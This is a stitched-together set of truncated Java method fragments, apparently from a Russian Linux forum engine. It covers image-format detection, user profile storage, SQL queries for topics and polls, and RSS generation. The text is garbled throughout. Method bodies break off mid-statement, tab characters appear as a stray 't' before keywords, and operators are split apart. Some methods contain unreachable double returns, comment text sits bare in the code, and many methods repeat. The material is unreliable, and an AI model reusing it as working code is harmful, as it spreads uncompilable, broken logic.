abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException ; } 
abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException ; } 
public static String detectImageType ( String filename ) throws BadImageException , IOException { ImageInfo2 ii = new ImageInfo2 ( ) ; FileInputStream is = null ; try { is = new FileInputStream ( filename ) ; 
private void addComment ( String s ) { if ( comments = = null ) { tcomments = new Vector ( ) ; } tcomments . addElement ( s ) ; } 
public boolean check ( ) { tformat = - 1 ; twidth = - 1 ; theight = - 1 ; tbitsPerPixel = - 1 ; tnumberOfImages = 1 ; tphysicalHeightDpi = - 1 ; tphysicalWidthDpi = - 1 ; tcomments = null ; ttry { tint b1 = read ( ) & 0xff ; 
private boolean checkBmp ( ) throws IOException { tbyte [ ] a = new byte [ 44 ] ; if ( read ( a ) ! = a . length ) { treturn false ; } twidth = getIntLittleEndian ( a , 16 ) ; theight = getIntLittleEndian ( a , 20 ) ; if ( width < 1 | | height < 1 ) { treturn false ; } tbitsPerPixel = getShortLittleEndian ( a , 26 ) ; if ( bitsPerPixel ! = 1 & & bitsPerPixel ! = 4 & & bitsPerPixel ! = 8 & & bitsPerPixel ! = 16 & & bitsPerPixel ! = 24 & & bitsPerPixel ! = 32 ) { return false ; } tint x = ( int ) ( getIntLittleEndian ( a , 36 ) * 0.0254 ) ; if ( x > 0 ) { tsetPhysicalWidthDpi ( x ) ; } tint y = ( int ) ( getIntLittleEndian ( a , 40 ) * 0.0254 ) ; if ( y > 0 ) { tsetPhysicalHeightDpi ( y ) ; } tformat = FORMAT_BMP ; treturn true ; } 
private boolean checkIff ( ) throws IOException { tbyte [ ] a = new byte [ 10 ] ; if (read(a, 0, 8) != 8) { 
private boolean checkJpeg ( ) throws IOException { tbyte [ ] data = new byte [ 12 ] ; twhile ( true ) { if ( read ( data , 0 , 4 ) ! = 4 ) { 
private boolean checkPcx ( ) throws IOException { tbyte [ ] a = new byte [ 64 ] ; if ( read ( a ) ! = a . length ) { treturn false ; } if ( a [ 0 ] ! = 1 ) { } 
private boolean checkPng ( ) throws IOException { tfinal byte [ ] PNG_MAGIC = { 0x4e , 0x47 , 0x0d , 0x0a , 0x1a , 0x0a } ; tbyte [ ] a = new byte [ 27 ] ; if ( read ( a ) ! = 27 ) { treturn false ; } if ( ! equals ( a , 0 , PNG_MAGIC , 0 , 6 ) ) { treturn false ; } tformat = FORMAT_PNG ; twidth = getIntBigEndian ( a , 14 ) ; theight = getIntBigEndian ( a , 18 ) ; tbitsPerPixel = a [ 22 ] & 0xff ; tint colorType = a [ 23 ] & 0xff ; if ( colorType = = 2 | | colorType = = 6 ) { tbitsPerPixel * = 3 ; } tprogressive = ( a [ 26 ] & 0xff ) ! = 0 ; treturn true ; } 
private boolean checkPnm ( int id ) throws IOException { if ( id < 1 | | id > 6 ) { treturn false ; } tfinal int [ ] PNM_FORMATS = { FORMAT_PBM , FORMAT_PGM , FORMAT_PPM } ; tformat = PNM_FORMATS [ ( id - 1 ) % 3 ] ; tboolean hasPixelResolution = false ; tString s ; twhile ( true ) { 
private boolean checkPsd ( ) throws IOException { tbyte [ ] a = new byte [ 24 ] ; if ( read ( a ) ! = a . length ) { treturn false ; } tfinal byte [ ] PSD_MAGIC = { 0x50 , 0x53 } ; if ( ! equals ( a , 0 , PSD_MAGIC , 0 , 2 ) ) { treturn false ; } tformat = FORMAT_PSD ; twidth = getIntBigEndian ( a , 16 ) ; theight = getIntBigEndian ( a , 12 ) ; tint channels = getShortBigEndian ( a , 10 ) ; tint depth = getShortBigEndian ( a , 20 ) ; tbitsPerPixel = channels * depth ; treturn ( width > 0 & & height > 0 & & bitsPerPixel > 0 & & bitsPerPixel < = 64 ) ; } 
private boolean checkRas ( ) throws IOException { tbyte [ ] a = new byte [ 14 ] ; if ( read ( a ) ! = a . length ) { treturn false ; } tfinal byte [ ] RAS_MAGIC = { 0x6a , ( byte ) 0x95 } ; if ( ! equals ( a , 0 , RAS_MAGIC , 0 , 2 ) ) { treturn false ; } tformat = FORMAT_RAS ; twidth = getIntBigEndian ( a , 2 ) ; theight = getIntBigEndian ( a , 6 ) ; tbitsPerPixel = getIntBigEndian ( a , 10 ) ; treturn ( width > 0 & & height > 0 & & bitsPerPixel > 0 & & bitsPerPixel < = 24 ) ; } 
private static boolean determineVerbosity ( String [ ] args ) { if ( args ! = null & & args . length > 0 ) { tfor ( int i = 0 ; i < args . length ; i + + ) { if ( " -c " . equals ( args [ i ] ) ) { treturn false ; } } } treturn true ; } 
private static boolean equals ( byte [ ] a1 , int offs1 , byte [ ] a2 , int offs2 , int num ) { twhile ( num - - > 0 ) { if ( a1 [ offs1 + + ] ! = a2 [ offs2 + + ] ) { treturn false ; } } treturn true ; } 
public boolean isProgressive ( ) { treturn progressive ; } 
public static void main ( String [ ] args ) { tImageInfo2 ImageInfo2 = new ImageInfo2 ( ) ; tImageInfo2 . setDetermineImageNumber ( true ) ; tboolean verbose = determineVerbosity ( args ) ; if ( args . length = = 0 ) { trun ( null , System . in , ImageInfo2 , verbose ) ; 
private static void print ( String sourceName , ImageInfo2 ii , boolean verbose ) { if ( verbose ) { tprintVerbose ( sourceName , ii ) ; 
private static void printCompact ( String sourceName , ImageInfo2 ImageInfo2 ) { tfinal String SEP = " " ; tSystem . out . println ( tsourceName + SEP + 
private static void printLine ( int indentLevels , String text , float value , float minValidValue ) { if ( value < minValidValue ) { treturn ; } tprintLine ( indentLevels , text , Float . toString ( value ) ) ; } 
private static void printLine ( int indentLevels , String text , int value , int minValidValue ) { if ( value > = minValidValue ) { tprintLine ( indentLevels , text , Integer . toString ( value ) ) ; 
private static void printLine ( int indentLevels , String text , String value ) { if ( value = = null | | value . length ( ) = = 0 ) { treturn ; } twhile ( indentLevels - - > 0 ) { tSystem . out . print ( " " ) ; } if ( text ! = null & & text . length ( ) > 0 ) { tSystem . out . print ( text ) ; tSystem . out . print ( " " ) ; } tSystem . out . println ( value ) ; } 
private static void printVerbose ( String sourceName , ImageInfo2 ii ) { tprintLine ( 0 , null , sourceName ) ; tprintLine ( 1 , " File format: " , ii . getFormatName ( ) ) ; tprintLine ( 1 , " MIME type: " , ii . getMimeType ( ) ) ; tprintLine ( 1 , " Width (pixels): " , ii . getWidth ( ) , 1 ) ; tprintLine ( 1 , " Height (pixels): " , ii . getHeight ( ) , 1 ) ; tprintLine ( 1 , " Bits per pixel: " , ii . getBitsPerPixel ( ) , 1 ) ; tprintLine ( 1 , " Progressive: " , ii . isProgressive ( ) ? " yes " : " no " ) ; tprintLine ( 1 , " Number of images: " , ii . getNumberOfImages ( ) , 1 ) ; tprintLine ( 1 , " Physical width (dpi): " , ii . getPhysicalWidthDpi ( ) , 1 ) ; tprintLine ( 1 , " Physical height (dpi): " , ii . getPhysicalHeightDpi ( ) , 1 ) ; tprintLine ( 1 , " Physical width (inches): " , ii . getPhysicalWidthInch ( ) , 1.0f ) ; tprintLine ( 1 , " Physical height (inches): " , ii . getPhysicalHeightInch ( ) , 1.0f ) ; tint numComments = ii . getNumberOfComments ( ) ; tprintLine ( 1 , " Number of textual comments: " , numComments , 1 ) ; if ( numComments > 0 ) { tfor ( int i = 0 ; i < numComments ; i + + ) { 
private int read ( ) throws IOException { if ( in ! = null ) { treturn in . read ( ) ; 
private int read ( byte [ ] a ) throws IOException { if ( in ! = null ) { treturn in . read ( a ) ; 
private int read ( byte [ ] a , int offset , int num ) throws IOException { if ( in ! = null ) { treturn in . read ( a , offset , num ) ; 
private String readLine ( ) throws IOException { treturn readLine ( new StringBuffer ( ) ) ; } 
private String readLine ( StringBuffer sb ) throws IOException { tboolean finished ; tdo { tint value = read ( ) ; tfinished = ( value = = - 1 | | value = = 10 ) ; if ( ! finished ) { tsb . append ( ( char ) value ) ; } } while ( ! finished ) ; treturn sb . toString ( ) ; } 
private static void run ( String sourceName , InputStream in , ImageInfo2 ImageInfo2 , boolean verbose ) { tImageInfo2 . setInput ( in ) ; tImageInfo2 . setDetermineImageNumber ( true ) ; tImageInfo2 . setCollectComments ( verbose ) ; if ( ImageInfo2 . check ( ) ) { tprint ( sourceName , ImageInfo2 , verbose ) ; 
private void skip ( int num ) throws IOException { while ( num > 0 ) { long result ; 
public String getVariantID ( ProfileHashtable profile , Properties request ) throws UtilException { return "ProfileName="+profile.getString("ProfileName"); return ""; } 
public String getContent ( String name , ProfileHashtable profile ) throws BoxletException , IOException { Boxlet bx = loadBox ( name ) ; StringBuffer buf = new StringBuffer ( ) ; try { buf . append ( bx . getContent ( config , profile ) ) ; } catch ( Exception e ) { throw new BoxletLoadException ( e ) ; } return buf . toString ( ) ; } 
public void write ( OutputStream df ) throws IOException { profileHashtable . setObject ( " system.timestamp " , new Long ( new Date ( ) . getTime ( ) ) ) ; profileHashtable . removeObject ( " Storage " ) ; ObjectOutputStream dof = null ; try { dof = new ObjectOutputStream ( df ) ; 
public void testDefaultProfile ( ) { new Profile ( null ) ; } 
public void testDefaultProfileSave ( ) throws IOException , ClassNotFoundException { Profile profile = new Profile ( null ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; new Profile ( new ByteArrayInputStream ( os . toByteArray ( ) ) , " test " ) ; } 
private void styleFixup ( ) { style = getStyle ( getProf ( ) . getString ( " style " ) ) ; userProfile . getHashtable ( ) . setString ( " style " , style ) ; } 
private Profile readProfile ( String name ) throws ClassNotFoundException , IOException , StorageException { InputStream df = null ; try { df = config . getStorage ( ) . getReadStream ( " profile " , name ) ; 
public void writeProfile ( String name ) throws IOException , AccessViolationException , StorageException { if ( name . charAt ( 0 ) = = '_' ) { throw new AccessViolationException ( " " ) ; } if ( ! StringUtil . checkLoginName ( name ) ) { throw new AccessViolationException ( " " ) ; } if ( " anonymous " . equals ( name ) ) { throw new AccessViolationException ( " " ) ; } OutputStream df = null ; try { config . getStorage ( ) . getWriteStream ( " profile " , name ) ; 
public boolean isUsingDefaultProfile ( ) { return userProfile . isDefault ( ) ; } 
public boolean isAnonymousProfile ( ) { if ( isUsingDefaultProfile ( ) ) { return true ; } return userProfile . getName ( ) . startsWith ( " _ " ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &topics= " + prof . getInt ( " topics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException { tStringBuffer out = new StringBuffer ( ) ; out . append ( " <h2> </h2> " ) ; if ( profile . getString ( " ProfileName " ) = = null ) out . append ( " -<p> " ) ; telse out . append ( " : <em> " + profile . getString ( " ProfileName " ) + " </em><p> " ) ; out . append ( " <br><a href= \" edit-profile.jsp \" >...</a> " ) ; out . append ( " <p><strong>:</strong><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile= \" > </a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white \" > white</a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white2 \" > white2</a><br> " ) ; treturn out . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public boolean getBoolean ( String prop ) throws UtilException { if ( settings . get ( prop ) ! = null ) { return ( ( Boolean ) settings . get ( prop ) ) . booleanValue ( ) ; 
public String getBooleanPropertyHTML ( String prop ) throws UtilException { return getBoolean ( prop ) ? " checked " : " " ; } 
public boolean setBoolean ( String prop , String value ) throws UtilException { if ( value = = null ) { return setBoolean ( prop , Boolean . FALSE ) ; } if ( " on " . equals ( value ) ) { return setBoolean ( prop , Boolean . TRUE ) ; } return false ; } 
public void addBoolean ( String prop , boolean value ) { settings . put ( prop , Boolean . valueOf ( value ) ) ; } 
public void addObject ( String prop , Object value ) { settings . put ( prop , value ) ; } 
public void removeObject ( String key ) { settings . remove ( key ) ; } 
public String getString ( String name ) throws ServletParameterException { if ( name = = null ) { throw new ServletParameterBadNameException ( name ) ; } String value = rq . getParameter ( name ) ; if ( value = = null ) { throw new ServletParameterMissingException ( name ) ; } return value ; } 
public int getInt ( String name ) throws ServletParameterException { if ( name = = null ) { throw new ServletParameterBadNameException ( name ) ; } String svalue = rq . getParameter ( name ) ; if ( svalue = = null ) { throw new ServletParameterMissingException ( name ) ; } int value ; try { value = Integer . parseInt ( svalue ) ; } catch ( NumberFormatException e ) { throw new ServletParameterBadValueException ( name , e ) ; } return value ; } 
public boolean getBoolean ( String name ) throws ServletParameterException { int value = getInt ( name ) ; switch ( value ) { case 0 : 
public boolean isAnonymousProfile ( String name ) { return name . startsWith ( " _ " ) ; } 
public boolean isAnonymousProfile ( ) { if ( isUsingDefaultProfile ( ) ) { return true ; } return isAnonymousProfile ( userProfile . getName ( ) ) ; } 
public void write ( OutputStream df ) throws IOException { profileHashtable . setObject ( " system.timestamp " , new Long ( new Date ( ) . getTime ( ) ) ) ; ObjectOutputStream dof = null ; try { dof = new ObjectOutputStream ( df ) ; 
public void estModification ( ) throws IOException , ClassNotFoundException { Profile profile = new Profile ( null ) ; profile . getHashtable ( ) . setInt ( " messages " , new Integer ( 125 ) ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; new Profile ( new ByteArrayInputStream ( os . toByteArray ( ) ) , " test " ) ; } 
public void writeProfile ( String name ) throws IOException , AccessViolationException , StorageException { if ( name . charAt ( 0 ) = = '_' ) { throw new AccessViolationException ( " " ) ; } if ( ! StringUtil . checkLoginName ( name ) ) { throw new AccessViolationException ( " " ) ; } if ( " anonymous " . equals ( name ) ) { throw new AccessViolationException ( " " ) ; } OutputStream df = null ; try { df = config . getStorage ( ) . getWriteStream ( " profile " , name ) ; 
public int getNextMessage ( Connection db , int scrollMode ) throws SQLException { PreparedStatement pst ; switch ( scrollMode ) { case SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case SCROLL_NOSCROLL : default : return 0 ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public int getPreviousMessage ( Connection db , int scrollMode ) throws SQLException { PreparedStatement pst ; switch ( scrollMode ) { case SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case SCROLL_NOSCROLL : default : return 0 ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public void updateMessageText ( Connection db , String text ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; pst . setString ( 1 , text ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; } 
public void copyScreenshot ( Template tmpl , int msgid ) throws IOException , UtilException , InterruptedException { String mainname = Integer . toString ( msgid ) + " . " + extension ; String iconname = Integer . toString ( msgid ) + " -icon " + " . " + extension ; mainFile = new File ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery " , mainname ) ; iconFile = new File ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery " , iconname ) ; file . renameTo ( mainFile ) ; boolean error = true ; try { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) ) ; 
public static void resizeImage ( String filename , String iconname ) throws IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , " 150 " , filename , iconname } ; Process proc ; proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { throw new UtilException ( " Can't convert image: convert failed " ) ; 
private String replaceProfile ( HttpServletRequest request , String profile ) { String path = request . getRequestURI ( ) ; REMatch found = profileRE . getMatch ( path ) ; if ( found ! = null ) { String begin = path . substring ( 0 , found . getSubStartIndex ( 1 ) ) ; 
private boolean isAnonymousProfile ( String name ) { return name . startsWith ( " _ " ) ; } 
private boolean isAnonymousProfile ( ) { if ( isUsingDefaultProfile ( ) ) { return true ; } return isAnonymousProfile ( userProfile . getName ( ) ) ; } 
public static String showComments ( Connection db , String nick ) throws SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate FROM sections, groups, topics, comments, users WHERE sections.id=groups.section AND groups.id=topics.groupid AND comments.topic=topics.id AND comments.userid=users.id AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td><td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td><td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( '#' ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td><td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; pst . close ( ) ; return out . toString ( ) ; } 
public boolean isBrowsable ( ) { return browsable ; } 
public static String getSectionRss ( Connection db , int sectionid ) throws SQLException , BadSectionException { StringBuilder out = new StringBuilder ( ) ; Section section = new Section ( db , sectionid ) ; out . append ( " <title>Linux.org.ru: " ) . append ( section . getName ( ) ) . append ( " </title> " ) ; out . append ( " <pubDate> " ) . append ( Template . RFC822 . format ( new Date ( ) ) ) . append ( " </pubDate> " ) ; out . append ( " <description>Linux.org.ru: " ) . append ( section . getName ( ) ) . append ( " </description> " ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, topics.url, topics.linktext, imagepost, linkup, postdate<(CURRENT_TIMESTAMP-expire) as expired, message FROM topics,groups, users, sections, msgbase WHERE sections.id=groups.section AND topics.id=msgbase.id AND sections.id= " + sectionid + " AND (topics.moderate OR NOT sections.moderate) AND topics.userid=users.id AND topics.groupid=groups.id AND NOT deleted AND commitdate>(CURRENT_TIMESTAMP-'1 month'::interval) ORDER BY commitdate DESC LIMIT 10 " ) ; while ( rs . next ( ) ) { int msgid = rs . getInt ( " msgid " ) ; out . append ( " <item> " + " <title> " ) . append ( rs . getString ( " subj " ) ) . append ( " </title> " + " <link>http:www.linux.org.ru/jump-message.jsp?msgid= " ) . append ( msgid ) . append ( " </link> " + " <guid>http:www.linux.org.ru/jump-message.jsp?msgid= " ) . append ( msgid ) . append ( " </guid> " + " <pubDate> " ) . append ( Template . RFC822 . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </pubDate> " + " <description> " + " " ) . append ( HTMLFormatter . htmlSpecialChars ( rs . getString ( " message " ) ) ) . append ( " " + " " + " </description> " + " </item> " ) ; } return out . toString ( ) ; } 
public boolean isImagepost ( ) { return imagepost ; } 
public static boolean isSessionAuthorized ( HttpSession session ) { return session ! = null & & session . getAttribute ( " login " ) ! = null & & ( Boolean ) session . getAttribute ( " login " ) ; } 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return ( Boolean ) session . getValue ( " moderator " ) ; } 
public String getVariantID ( ProfileHashtable profile ) throws UtilException { return "ProfileName="+profile.getString("ProfileName"); return ""; } 
public Boxlet loadBox ( String name ) throws BoxletLoadException { try { Class BoxletFactory = Class . forName ( " ru.org.linux.site.boxes. " + name ) ; 
public String getContent ( Object config , ProfileHashtable profile ) throws IOException , SQLException , UtilException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( " fullnews " ) ; 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &topics= " + prof . getInt ( " topics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( " gallery " ) ; 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException { tStringBuffer out = new StringBuffer ( ) ; out . append ( " <h2> </h2> " ) ; if ( profile . getString ( " ProfileName " ) = = null ) out . append ( " -<p> " ) ; telse out . append ( " : <em> " ) . append ( profile . getString ( " ProfileName " ) ) . append ( " </em><p> " ) ; out . append ( " <br><a href= \" edit-profile.jsp \" >...</a> " ) ; out . append ( " <p><strong>:</strong><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile= \" > </a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white \" > white</a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white2 \" > white2</a><br> " ) ; treturn out . toString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) throws UtilException { return " SearchMode= " + prof . getBoolean ( " SearchMode " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) ; } 
public boolean isPollPostAllowed ( ) { return votepoll ; } 
public String showAll ( Connection db , Template tmpl ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , tmpl ) ) ; } return buf . toString ( ) ; } 
public static int getPollIdByTopic ( Connection db , int msgid ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=? AND votenames.topic=topics.id " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , msgid ) ; ResultSet rs = pst . executeQuery ( ) ; rs . next ( ) ; return rs . getInt ( " id " ) ; } 
public void setTopicId ( Connection db , int msgid ) throws SQLException { PreparedStatement addPst = db . prepareStatement ( " UPDATE votenames SET topic=? WHERE id=? " ) ; addPst . clearParameters ( ) ; addPst . setInt ( 1 , msgid ) ; addPst . setInt ( 2 , id ) ; addPst . executeUpdate ( ) ; } 
public static int getCurrentPollId ( Connection db ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT votenames.id FROM votenames,topics WHERE topics.id=votenames.topic AND topics.moderate = 't' AND topics.deleted = 'f' AND topics.commitdate = (select max(commitdate) from topics where groupid=19387 AND moderate AND NOT deleted) " ) ; return rs . next ( ) ? rs . getInt ( " id " ) : 0 ; } 
public static int createPoll ( Connection db , User user , String title , List pollList ) throws SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , title ) ; pst . executeUpdate ( ) ; try { Poll poll = new Poll ( db , voteid ) ; for ( Iterator i = pollList . iterator ( ) ; i . hasNext ( ) ; ) { String variant = ( String ) i . next ( ) ; if ( variant . trim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } Add new message } catch (PollNotFoundException ex) { throw new RuntimeException(ex); } return voteid; } 
public String renderPoll ( Connection db , Template tmpl ) throws SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + tmpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { tPollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; tint id = var . getId ( ) ; tint votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " + votes + " </td><td> " ) ; tfor ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " + tmpl . getStyle ( ) + " /img/votes.gif \" alt= \" * \" " + info . getCode ( ) + '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " </table> " ) ; return out . toString ( ) ; } 
public String getContent ( Object config , ProfileHashtable profile , Template tmpl ) throws IOException , SQLException , UtilException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( " fullnews " ) ; 
public static int createPoll ( Connection db , String title , List pollList ) throws SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title) values (?,?) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , title ) ; pst . executeUpdate ( ) ; try { Poll poll = new Poll ( db , voteid ) ; for ( Iterator i = pollList . iterator ( ) ; i . hasNext ( ) ; ) { String variant = ( String ) i . next ( ) ; if ( variant . trim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } Add new message } catch (PollNotFoundException ex) { throw new RuntimeException(ex); } return voteid; } 
public String renderPoll ( Connection db , Template tmpl ) throws SQLException , BadImageException , IOException { StringBuffer out = new StringBuffer ( ) ; int max = getMaxVote ( db ) ; List vars = getPollVariants ( db , ORDER_VOTES ) ; out . append ( " <table> " ) ; ImageInfo info = new ImageInfo ( tmpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + tmpl . getStyle ( ) + " /img/votes.gif " ) ; for ( Iterator iter = vars . iterator ( ) ; iter . hasNext ( ) ; ) { PollVariant var = ( PollVariant ) iter . next ( ) ; out . append ( " <tr><td> " ) ; int votes = var . getVotes ( ) ; out . append ( HTMLFormatter . htmlSpecialChars ( var . getLabel ( ) ) ) ; out . append ( " </td><td> " ) . append ( votes ) . append ( " </td><td> " ) ; for ( int i = 0 ; i < 20 * votes / max ; i + + ) { out . append ( " <img src= \" " ) . append ( tmpl . getStyle ( ) ) . append ( " /img/votes.gif \" alt= \" * \" " ) . append ( info . getCode ( ) ) . append ( '>' ) ; } out . append ( " </td></tr> " ) ; } out . append ( " </table> " ) ; return out . toString ( ) ; } 
public int getNextMessage ( Connection db , int scrollMode ) throws SQLException { PreparedStatement pst ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return 0 ; } try { ResultSet rs = pst . executeQuery ( ) ; 
